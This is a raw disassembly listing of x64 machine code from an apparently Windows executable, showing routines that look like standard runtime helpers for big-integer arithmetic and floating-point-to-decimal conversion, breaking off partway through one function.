   140006935:	48 98                	cltq
   140006937:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   14000693e:	00 
   14000693f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140006943:	48 01 d0             	add    %rdx,%rax
   140006946:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000694a:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   14000694e:	8b 00                	mov    (%rax),%eax
   140006950:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
   140006954:	8b 12                	mov    (%rdx),%edx
   140006956:	8d 4a 01             	lea    0x1(%rdx),%ecx
   140006959:	ba 00 00 00 00       	mov    $0x0,%edx
   14000695e:	f7 f1                	div    %ecx
   140006960:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   140006963:	83 7d e4 00          	cmpl   $0x0,-0x1c(%rbp)
   140006967:	0f 84 c4 00 00 00    	je     0x140006a31
   14000696d:	48 c7 45 d0 00 00 00 	movq   $0x0,-0x30(%rbp)
   140006974:	00 
   140006975:	48 c7 45 c8 00 00 00 	movq   $0x0,-0x38(%rbp)
   14000697c:	00 
   14000697d:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140006981:	48 8d 50 04          	lea    0x4(%rax),%rdx
   140006985:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   140006989:	8b 00                	mov    (%rax),%eax
   14000698b:	89 c2                	mov    %eax,%edx
   14000698d:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140006990:	48 0f af d0          	imul   %rax,%rdx
   140006994:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
   140006998:	48 01 d0             	add    %rdx,%rax
   14000699b:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   14000699f:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   1400069a3:	48 c1 e8 20          	shr    $0x20,%rax
   1400069a7:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   1400069ab:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400069af:	8b 00                	mov    (%rax),%eax
   1400069b1:	89 c1                	mov    %eax,%ecx
   1400069b3:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   1400069b7:	89 c2                	mov    %eax,%edx
   1400069b9:	48 89 c8             	mov    %rcx,%rax
   1400069bc:	48 29 d0             	sub    %rdx,%rax
   1400069bf:	48 2b 45 d0          	sub    -0x30(%rbp),%rax
   1400069c3:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   1400069c7:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
   1400069cb:	48 c1 e8 20          	shr    $0x20,%rax
   1400069cf:	83 e0 01             	and    $0x1,%eax
   1400069d2:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   1400069d6:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400069da:	48 8d 50 04          	lea    0x4(%rax),%rdx
   1400069de:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   1400069e2:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
   1400069e6:	89 10                	mov    %edx,(%rax)
   1400069e8:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400069ec:	48 39 45 c0          	cmp    %rax,-0x40(%rbp)
   1400069f0:	73 8b                	jae    0x14000697d
   1400069f2:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400069f6:	8b 00                	mov    (%rax),%eax
   1400069f8:	85 c0                	test   %eax,%eax
   1400069fa:	75 35                	jne    0x140006a31
   1400069fc:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140006a00:	48 83 c0 18          	add    $0x18,%rax
   140006a04:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140006a08:	eb 04                	jmp    0x140006a0e
   140006a0a:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
   140006a0e:	48 83 6d e8 04       	subq   $0x4,-0x18(%rbp)
   140006a13:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140006a17:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
   140006a1b:	73 0a                	jae    0x140006a27
   140006a1d:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140006a21:	8b 00                	mov    (%rax),%eax
   140006a23:	85 c0                	test   %eax,%eax
   140006a25:	74 e3                	je     0x140006a0a
   140006a27:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140006a2b:	8b 55 fc             	mov    -0x4(%rbp),%edx
   140006a2e:	89 50 14             	mov    %edx,0x14(%rax)
   140006a31:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140006a35:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140006a39:	48 89 c1             	mov    %rax,%rcx
   140006a3c:	e8 bc 24 00 00       	call   0x140008efd
   140006a41:	85 c0                	test   %eax,%eax
   140006a43:	0f 88 f1 00 00 00    	js     0x140006b3a
   140006a49:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
   140006a4d:	48 c7 45 d0 00 00 00 	movq   $0x0,-0x30(%rbp)
   140006a54:	00 
   140006a55:	48 c7 45 c8 00 00 00 	movq   $0x0,-0x38(%rbp)
   140006a5c:	00 
   140006a5d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140006a61:	48 83 c0 18          	add    $0x18,%rax
   140006a65:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140006a69:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140006a6d:	48 83 c0 18          	add    $0x18,%rax
   140006a71:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140006a75:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140006a79:	48 8d 50 04          	lea    0x4(%rax),%rdx
   140006a7d:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   140006a81:	8b 00                	mov    (%rax),%eax
   140006a83:	89 c2                	mov    %eax,%edx
   140006a85:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
   140006a89:	48 01 d0             	add    %rdx,%rax
   140006a8c:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140006a90:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   140006a94:	48 c1 e8 20          	shr    $0x20,%rax
   140006a98:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   140006a9c:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140006aa0:	8b 00                	mov    (%rax),%eax
   140006aa2:	89 c1                	mov    %eax,%ecx
   140006aa4:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   140006aa8:	89 c2                	mov    %eax,%edx
   140006aaa:	48 89 c8             	mov    %rcx,%rax
   140006aad:	48 29 d0             	sub    %rdx,%rax
   140006ab0:	48 2b 45 d0          	sub    -0x30(%rbp),%rax
   140006ab4:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   140006ab8:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
   140006abc:	48 c1 e8 20          	shr    $0x20,%rax
   140006ac0:	83 e0 01             	and    $0x1,%eax
   140006ac3:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   140006ac7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140006acb:	48 8d 50 04          	lea    0x4(%rax),%rdx
   140006acf:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140006ad3:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
   140006ad7:	89 10                	mov    %edx,(%rax)
   140006ad9:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140006add:	48 39 45 c0          	cmp    %rax,-0x40(%rbp)
   140006ae1:	73 92                	jae    0x140006a75
   140006ae3:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140006ae7:	48 83 c0 18          	add    $0x18,%rax
   140006aeb:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140006aef:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140006af2:	48 98                	cltq
   140006af4:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   140006afb:	00 
   140006afc:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140006b00:	48 01 d0             	add    %rdx,%rax
   140006b03:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140006b07:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140006b0b:	8b 00                	mov    (%rax),%eax
   140006b0d:	85 c0                	test   %eax,%eax
   140006b0f:	75 29                	jne    0x140006b3a
   140006b11:	eb 04                	jmp    0x140006b17
   140006b13:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
   140006b17:	48 83 6d e8 04       	subq   $0x4,-0x18(%rbp)
   140006b1c:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140006b20:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
   140006b24:	73 0a                	jae    0x140006b30
   140006b26:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140006b2a:	8b 00                	mov    (%rax),%eax
   140006b2c:	85 c0                	test   %eax,%eax
   140006b2e:	74 e3                	je     0x140006b13
   140006b30:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140006b34:	8b 55 fc             	mov    -0x4(%rbp),%edx
   140006b37:	89 50 14             	mov    %edx,0x14(%rax)
   140006b3a:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140006b3d:	48 83 c4 70          	add    $0x70,%rsp
   140006b41:	5d                   	pop    %rbp
   140006b42:	c3                   	ret
   140006b43:	90                   	nop
   140006b44:	90                   	nop
   140006b45:	90                   	nop
   140006b46:	90                   	nop
   140006b47:	90                   	nop
   140006b48:	90                   	nop
   140006b49:	90                   	nop
   140006b4a:	90                   	nop
   140006b4b:	90                   	nop
   140006b4c:	90                   	nop
   140006b4d:	90                   	nop
   140006b4e:	90                   	nop
   140006b4f:	90                   	nop
   140006b50:	55                   	push   %rbp
   140006b51:	48 89 e5             	mov    %rsp,%rbp
   140006b54:	89 4d 10             	mov    %ecx,0x10(%rbp)
   140006b57:	0f bd 45 10          	bsr    0x10(%rbp),%eax
   140006b5b:	83 f0 1f             	xor    $0x1f,%eax
   140006b5e:	5d                   	pop    %rbp
   140006b5f:	c3                   	ret
   140006b60:	55                   	push   %rbp
   140006b61:	53                   	push   %rbx
   140006b62:	48 83 ec 58          	sub    $0x58,%rsp
   140006b66:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140006b6b:	48 89 4d 20          	mov    %rcx,0x20(%rbp)
   140006b6f:	89 55 28             	mov    %edx,0x28(%rbp)
   140006b72:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   140006b76:	c7 45 fc 20 00 00 00 	movl   $0x20,-0x4(%rbp)
   140006b7d:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
   140006b84:	eb 07                	jmp    0x140006b8d
   140006b86:	d1 65 fc             	shll   $1,-0x4(%rbp)
   140006b89:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
   140006b8d:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140006b90:	3b 45 28             	cmp    0x28(%rbp),%eax
   140006b93:	7c f1                	jl     0x140006b86
   140006b95:	8b 45 f8             	mov    -0x8(%rbp),%eax
   140006b98:	89 c1                	mov    %eax,%ecx
   140006b9a:	e8 ae 1a 00 00       	call   0x14000864d
   140006b9f:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140006ba3:	8b 45 28             	mov    0x28(%rbp),%eax
   140006ba6:	83 e8 01             	sub    $0x1,%eax
   140006ba9:	c1 f8 05             	sar    $0x5,%eax
   140006bac:	48 98                	cltq
   140006bae:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   140006bb5:	00 
   140006bb6:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140006bba:	48 01 d0             	add    %rdx,%rax
   140006bbd:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140006bc1:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140006bc5:	48 83 c0 18          	add    $0x18,%rax
   140006bc9:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140006bcd:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140006bd1:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140006bd5:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140006bd9:	48 8d 50 04          	lea    0x4(%rax),%rdx
   140006bdd:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140006be1:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140006be5:	8b 12                	mov    (%rdx),%edx
   140006be7:	89 10                	mov    %edx,(%rax)
   140006be9:	48 83 45 20 04       	addq   $0x4,0x20(%rbp)
   140006bee:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140006bf2:	48 39 45 e0          	cmp    %rax,-0x20(%rbp)
   140006bf6:	73 dd                	jae    0x140006bd5
   140006bf8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140006bfc:	48 2b 45 d8          	sub    -0x28(%rbp),%rax
   140006c00:	48 c1 f8 02          	sar    $0x2,%rax
   140006c04:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140006c07:	eb 1d                	jmp    0x140006c26
   140006c09:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140006c0d:	75 17                	jne    0x140006c26
   140006c0f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140006c13:	c7 40 14 00 00 00 00 	movl   $0x0,0x14(%rax)
   140006c1a:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140006c1e:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140006c24:	eb 59                	jmp    0x140006c7f
   140006c26:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
   140006c2a:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140006c2d:	48 98                	cltq
   140006c2f:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   140006c36:	00 
   140006c37:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140006c3b:	48 01 d0             	add    %rdx,%rax
   140006c3e:	8b 00                	mov    (%rax),%eax
   140006c40:	85 c0                	test   %eax,%eax
   140006c42:	74 c5                	je     0x140006c09
   140006c44:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140006c47:	8d 50 01             	lea    0x1(%rax),%edx
   140006c4a:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140006c4e:	89 50 14             	mov    %edx,0x14(%rax)
   140006c51:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140006c54:	83 c0 01             	add    $0x1,%eax
   140006c57:	c1 e0 05             	shl    $0x5,%eax
   140006c5a:	89 c3                	mov    %eax,%ebx
   140006c5c:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140006c60:	8b 55 fc             	mov    -0x4(%rbp),%edx
   140006c63:	48 63 d2             	movslq %edx,%rdx
   140006c66:	48 83 c2 04          	add    $0x4,%rdx
   140006c6a:	8b 44 90 08          	mov    0x8(%rax,%rdx,4),%eax
   140006c6e:	89 c1                	mov    %eax,%ecx
   140006c70:	e8 db fe ff ff       	call   0x140006b50
   140006c75:	29 c3                	sub    %eax,%ebx
   140006c77:	89 da                	mov    %ebx,%edx
   140006c79:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140006c7d:	89 10                	mov    %edx,(%rax)
   140006c7f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140006c83:	48 83 c4 58          	add    $0x58,%rsp
   140006c87:	5b                   	pop    %rbx
   140006c88:	5d                   	pop    %rbp
   140006c89:	c3                   	ret
   140006c8a:	55                   	push   %rbp
   140006c8b:	48 81 ec 00 01 00 00 	sub    $0x100,%rsp
   140006c92:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   140006c99:	00 
   140006c9a:	48 89 8d 90 00 00 00 	mov    %rcx,0x90(%rbp)
   140006ca1:	89 95 98 00 00 00    	mov    %edx,0x98(%rbp)
   140006ca7:	4c 89 85 a0 00 00 00 	mov    %r8,0xa0(%rbp)
   140006cae:	4c 89 8d a8 00 00 00 	mov    %r9,0xa8(%rbp)
   140006cb5:	c7 45 64 00 00 00 00 	movl   $0x0,0x64(%rbp)
   140006cbc:	48 8b 85 a8 00 00 00 	mov    0xa8(%rbp),%rax
   140006cc3:	8b 00                	mov    (%rax),%eax
   140006cc5:	83 e0 cf             	and    $0xffffffcf,%eax
   140006cc8:	89 c2                	mov    %eax,%edx
   140006cca:	48 8b 85 a8 00 00 00 	mov    0xa8(%rbp),%rax
   140006cd1:	89 10                	mov    %edx,(%rax)
   140006cd3:	48 8b 85 a8 00 00 00 	mov    0xa8(%rbp),%rax
   140006cda:	8b 00                	mov    (%rax),%eax
   140006cdc:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140006cdf:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140006ce2:	83 e0 07             	and    $0x7,%eax
   140006ce5:	83 f8 04             	cmp    $0x4,%eax
   140006ce8:	0f 84 b0 00 00 00    	je     0x140006d9e
   140006cee:	83 f8 04             	cmp    $0x4,%eax
   140006cf1:	0f 8f d5 00 00 00    	jg     0x140006dcc
   140006cf7:	83 f8 03             	cmp    $0x3,%eax
   140006cfa:	74 74                	je     0x140006d70
   140006cfc:	83 f8 03             	cmp    $0x3,%eax
   140006cff:	0f 8f c7 00 00 00    	jg     0x140006dcc
   140006d05:	85 c0                	test   %eax,%eax
   140006d07:	0f 84 05 01 00 00    	je     0x140006e12
   140006d0d:	85 c0                	test   %eax,%eax
   140006d0f:	0f 88 b7 00 00 00    	js     0x140006dcc
   140006d15:	83 e8 01             	sub    $0x1,%eax
   140006d18:	83 f8 01             	cmp    $0x1,%eax
   140006d1b:	0f 87 ab 00 00 00    	ja     0x140006dcc
   140006d21:	90                   	nop
   140006d22:	48 8b 85 90 00 00 00 	mov    0x90(%rbp),%rax
   140006d29:	8b 00                	mov    (%rax),%eax
   140006d2b:	89 45 f8             	mov    %eax,-0x8(%rbp)
   140006d2e:	48 8d 4d b4          	lea    -0x4c(%rbp),%rcx
   140006d32:	8b 55 f8             	mov    -0x8(%rbp),%edx
   140006d35:	48 8b 85 a0 00 00 00 	mov    0xa0(%rbp),%rax
   140006d3c:	49 89 c8             	mov    %rcx,%r8
   140006d3f:	48 89 c1             	mov    %rax,%rcx
   140006d42:	e8 19 fe ff ff       	call   0x140006b60
   140006d47:	48 89 45 28          	mov    %rax,0x28(%rbp)
   140006d4b:	8b 85 98 00 00 00    	mov    0x98(%rbp),%eax
   140006d51:	89 45 f4             	mov    %eax,-0xc(%rbp)
   140006d54:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140006d58:	48 89 c1             	mov    %rax,%rcx
   140006d5b:	e8 31 16 00 00       	call   0x140008391
   140006d60:	89 45 b0             	mov    %eax,-0x50(%rbp)
   140006d63:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140006d66:	85 c0                	test   %eax,%eax
   140006d68:	0f 84 8b 00 00 00    	je     0x140006df9
   140006d6e:	eb 66                	jmp    0x140006dd6
   140006d70:	48 8b 85 c0 00 00 00 	mov    0xc0(%rbp),%rax
   140006d77:	c7 00 00 80 ff ff    	movl   $0xffff8000,(%rax)
   140006d7d:	48 8b 85 c8 00 00 00 	mov    0xc8(%rbp),%rax
   140006d84:	48 8d 0d 65 57 00 00 	lea    0x5765(%rip),%rcx        # 0x14000c4f0
   140006d8b:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140006d91:	48 89 c2             	mov    %rax,%rdx
   140006d94:	e8 79 fa ff ff       	call   0x140006812
   140006d99:	e9 4a 14 00 00       	jmp    0x1400081e8
   140006d9e:	48 8b 85 c0 00 00 00 	mov    0xc0(%rbp),%rax
   140006da5:	c7 00 00 80 ff ff    	movl   $0xffff8000,(%rax)
   140006dab:	48 8b 85 c8 00 00 00 	mov    0xc8(%rbp),%rax
   140006db2:	48 8d 0d 40 57 00 00 	lea    0x5740(%rip),%rcx        # 0x14000c4f9
   140006db9:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140006dbf:	48 89 c2             	mov    %rax,%rdx
   140006dc2:	e8 4b fa ff ff       	call   0x140006812
   140006dc7:	e9 1c 14 00 00       	jmp    0x1400081e8
   140006dcc:	b8 00 00 00 00       	mov    $0x0,%eax
   140006dd1:	e9 12 14 00 00       	jmp    0x1400081e8
   140006dd6:	8b 55 b0             	mov    -0x50(%rbp),%edx
   140006dd9:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140006ddd:	48 89 c1             	mov    %rax,%rcx
   140006de0:	e8 50 14 00 00       	call   0x140008235
   140006de5:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140006de8:	01 85 98 00 00 00    	add    %eax,0x98(%rbp)
   140006dee:	8b 55 b4             	mov    -0x4c(%rbp),%edx
   140006df1:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140006df4:	29 c2                	sub    %eax,%edx
   140006df6:	89 55 b4             	mov    %edx,-0x4c(%rbp)
   140006df9:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140006dfd:	8b 40 14             	mov    0x14(%rax),%eax
   140006e00:	85 c0                	test   %eax,%eax
   140006e02:	75 3d                	jne    0x140006e41
   140006e04:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140006e08:	48 89 c1             	mov    %rax,%rcx
   140006e0b:	e8 7e 19 00 00       	call   0x14000878e
   140006e10:	eb 01                	jmp    0x140006e13
   140006e12:	90                   	nop
   140006e13:	48 8b 85 c0 00 00 00 	mov    0xc0(%rbp),%rax
   140006e1a:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140006e20:	48 8b 85 c8 00 00 00 	mov    0xc8(%rbp),%rax
   140006e27:	48 8d 0d cf 56 00 00 	lea    0x56cf(%rip),%rcx        # 0x14000c4fd
   140006e2e:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140006e34:	48 89 c2             	mov    %rax,%rdx
   140006e37:	e8 d6 f9 ff ff       	call   0x140006812
   140006e3c:	e9 a7 13 00 00       	jmp    0x1400081e8
   140006e41:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   140006e45:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140006e49:	48 89 c1             	mov    %rax,%rcx
   140006e4c:	e8 75 23 00 00       	call   0x1400091c6
   140006e51:	66 48 0f 7e c0       	movq   %xmm0,%rax
   140006e56:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
   140006e5a:	8b 55 b4             	mov    -0x4c(%rbp),%edx
   140006e5d:	8b 85 98 00 00 00    	mov    0x98(%rbp),%eax
   140006e63:	01 d0                	add    %edx,%eax
   140006e65:	83 e8 01             	sub    $0x1,%eax
   140006e68:	89 45 b0             	mov    %eax,-0x50(%rbp)
   140006e6b:	8b 45 ac             	mov    -0x54(%rbp),%eax
   140006e6e:	25 ff ff 0f 00       	and    $0xfffff,%eax
   140006e73:	89 45 ac             	mov    %eax,-0x54(%rbp)
   140006e76:	8b 45 ac             	mov    -0x54(%rbp),%eax
   140006e79:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
   140006e7e:	89 45 ac             	mov    %eax,-0x54(%rbp)
   140006e81:	f2 0f 10 45 a8       	movsd  -0x58(%rbp),%xmm0
   140006e86:	f2 0f 10 15 72 56 00 	movsd  0x5672(%rip),%xmm2        # 0x14000c500
   140006e8d:	00 
   140006e8e:	66 0f 28 c8          	movapd %xmm0,%xmm1
   140006e92:	f2 0f 5c ca          	subsd  %xmm2,%xmm1
   140006e96:	f2 0f 10 05 6a 56 00 	movsd  0x566a(%rip),%xmm0        # 0x14000c508
   140006e9d:	00 
   140006e9e:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
   140006ea2:	f2 0f 10 05 66 56 00 	movsd  0x5666(%rip),%xmm0        # 0x14000c510
   140006ea9:	00 
   140006eaa:	f2 0f 58 c8          	addsd  %xmm0,%xmm1
   140006eae:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140006eb1:	66 0f ef d2          	pxor   %xmm2,%xmm2
   140006eb5:	f2 0f 2a d0          	cvtsi2sd %eax,%xmm2
   140006eb9:	f2 0f 10 05 57 56 00 	movsd  0x5657(%rip),%xmm0        # 0x14000c518
   140006ec0:	00 
   140006ec1:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
   140006ec5:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
   140006ec9:	f2 0f 11 45 08       	movsd  %xmm0,0x8(%rbp)
   140006ece:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140006ed1:	89 45 60             	mov    %eax,0x60(%rbp)
   140006ed4:	83 7d 60 00          	cmpl   $0x0,0x60(%rbp)
   140006ed8:	79 03                	jns    0x140006edd
   140006eda:	f7 5d 60             	negl   0x60(%rbp)
   140006edd:	81 6d 60 35 04 00 00 	subl   $0x435,0x60(%rbp)
   140006ee4:	83 7d 60 00          	cmpl   $0x0,0x60(%rbp)
   140006ee8:	7e 23                	jle    0x140006f0d
   140006eea:	66 0f ef c9          	pxor   %xmm1,%xmm1
   140006eee:	f2 0f 2a 4d 60       	cvtsi2sdl 0x60(%rbp),%xmm1
   140006ef3:	f2 0f 10 05 25 56 00 	movsd  0x5625(%rip),%xmm0        # 0x14000c520
   140006efa:	00 
   140006efb:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
   140006eff:	f2 0f 10 4d 08       	movsd  0x8(%rbp),%xmm1
   140006f04:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
   140006f08:	f2 0f 11 45 08       	movsd  %xmm0,0x8(%rbp)
   140006f0d:	f2 0f 10 45 08       	movsd  0x8(%rbp),%xmm0
   140006f12:	f2 0f 2c c0          	cvttsd2si %xmm0,%eax
   140006f16:	89 45 58             	mov    %eax,0x58(%rbp)
   140006f19:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140006f1d:	66 0f 2f 45 08       	comisd 0x8(%rbp),%xmm0
   140006f22:	76 1b                	jbe    0x140006f3f
   140006f24:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140006f28:	f2 0f 2a 45 58       	cvtsi2sdl 0x58(%rbp),%xmm0
   140006f2d:	66 0f 2e 45 08       	ucomisd 0x8(%rbp),%xmm0
   140006f32:	7a 07                	jp     0x140006f3b
   140006f34:	66 0f 2e 45 08       	ucomisd 0x8(%rbp),%xmm0
   140006f39:	74 04                	je     0x140006f3f
   140006f3b:	83 6d 58 01          	subl   $0x1,0x58(%rbp)
   140006f3f:	c7 45 54 01 00 00 00 	movl   $0x1,0x54(%rbp)
   140006f46:	8b 45 ac             	mov    -0x54(%rbp),%eax
   140006f49:	8b 4d b4             	mov    -0x4c(%rbp),%ecx
   140006f4c:	8b 95 98 00 00 00    	mov    0x98(%rbp),%edx
   140006f52:	01 ca                	add    %ecx,%edx
   140006f54:	83 ea 01             	sub    $0x1,%edx
   140006f57:	c1 e2 14             	shl    $0x14,%edx
   140006f5a:	01 d0                	add    %edx,%eax
   140006f5c:	89 45 ac             	mov    %eax,-0x54(%rbp)
   140006f5f:	83 7d 58 00          	cmpl   $0x0,0x58(%rbp)
   140006f63:	78 2e                	js     0x140006f93
   140006f65:	83 7d 58 16          	cmpl   $0x16,0x58(%rbp)
   140006f69:	7f 28                	jg     0x140006f93
   140006f6b:	f2 0f 10 4d a8       	movsd  -0x58(%rbp),%xmm1
   140006f70:	48 8b 05 79 58 00 00 	mov    0x5879(%rip),%rax        # 0x14000c7f0
   140006f77:	8b 55 58             	mov    0x58(%rbp),%edx
   140006f7a:	48 63 d2             	movslq %edx,%rdx
   140006f7d:	f2 0f 10 04 d0       	movsd  (%rax,%rdx,8),%xmm0
   140006f82:	66 0f 2f c1          	comisd %xmm1,%xmm0
   140006f86:	76 04                	jbe    0x140006f8c
   140006f88:	83 6d 58 01          	subl   $0x1,0x58(%rbp)
   140006f8c:	c7 45 54 00 00 00 00 	movl   $0x0,0x54(%rbp)
   140006f93:	8b 55 b4             	mov    -0x4c(%rbp),%edx
   140006f96:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140006f99:	29 c2                	sub    %eax,%edx
   140006f9b:	8d 42 ff             	lea    -0x1(%rdx),%eax
   140006f9e:	89 45 60             	mov    %eax,0x60(%rbp)
   140006fa1:	83 7d 60 00          	cmpl   $0x0,0x60(%rbp)
   140006fa5:	78 0f                	js     0x140006fb6
   140006fa7:	c7 45 7c 00 00 00 00 	movl   $0x0,0x7c(%rbp)
   140006fae:	8b 45 60             	mov    0x60(%rbp),%eax
   140006fb1:	89 45 40             	mov    %eax,0x40(%rbp)
   140006fb4:	eb 0f                	jmp    0x140006fc5
   140006fb6:	8b 45 60             	mov    0x60(%rbp),%eax
   140006fb9:	f7 d8                	neg    %eax
   140006fbb:	89 45 7c             	mov    %eax,0x7c(%rbp)
   140006fbe:	c7 45 40 00 00 00 00 	movl   $0x0,0x40(%rbp)
   140006fc5:	83 7d 58 00          	cmpl   $0x0,0x58(%rbp)
   140006fc9:	78 15                	js     0x140006fe0
   140006fcb:	c7 45 78 00 00 00 00 	movl   $0x0,0x78(%rbp)
   140006fd2:	8b 45 58             	mov    0x58(%rbp),%eax
   140006fd5:	89 45 3c             	mov    %eax,0x3c(%rbp)
   140006fd8:	8b 45 58             	mov    0x58(%rbp),%eax
   140006fdb:	01 45 40             	add    %eax,0x40(%rbp)
   140006fde:	eb 15                	jmp    0x140006ff5
   140006fe0:	8b 45 58             	mov    0x58(%rbp),%eax
   140006fe3:	29 45 7c             	sub    %eax,0x7c(%rbp)
   140006fe6:	8b 45 58             	mov    0x58(%rbp),%eax
   140006fe9:	f7 d8                	neg    %eax
   140006feb:	89 45 78             	mov    %eax,0x78(%rbp)
   140006fee:	c7 45 3c 00 00 00 00 	movl   $0x0,0x3c(%rbp)
   140006ff5:	83 bd b0 00 00 00 00 	cmpl   $0x0,0xb0(%rbp)
   140006ffc:	78 09                	js     0x140007007
